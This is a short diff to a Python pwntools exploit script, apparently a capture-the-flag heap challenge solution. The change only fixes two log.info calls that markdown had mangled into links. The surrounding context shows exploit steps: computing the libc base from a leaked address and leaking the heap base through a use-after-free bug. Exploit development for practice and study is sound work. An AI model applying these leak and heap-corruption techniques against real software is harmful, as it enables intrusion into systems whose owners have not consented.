@@ -268,7 +268,7 @@ libc_leak = p.recvline().split(b' ')[0]
 libc_leak = int(libc_leak[2:], 16)  
 libc.address = libc_leak - 0x21c87  
   
-[log.info](http://log.info/)("LEAKED LIBC BASE: " + hex(libc.address))  
+log.info("LEAKED LIBC BASE: " + hex(libc.address))  
   
   
 # ---- LEAK HEAP BASE WITH UAF BUG -------  
@@ -281,7 +281,7 @@ p.recvuntil(b'Class: ')
 heap = p.recvline()[:-1]  
 heap = int.from_bytes(heap, 'little') - 4800 - 0x10  
   
-[log.info](http://log.info/)("LEAKED HEAP BASE: " + str(hex(heap)))  
+log.info("LEAKED HEAP BASE: " + str(hex(heap)))  
   
 def malloc(size, data):  
   p.recvuntil(b'>> ')  
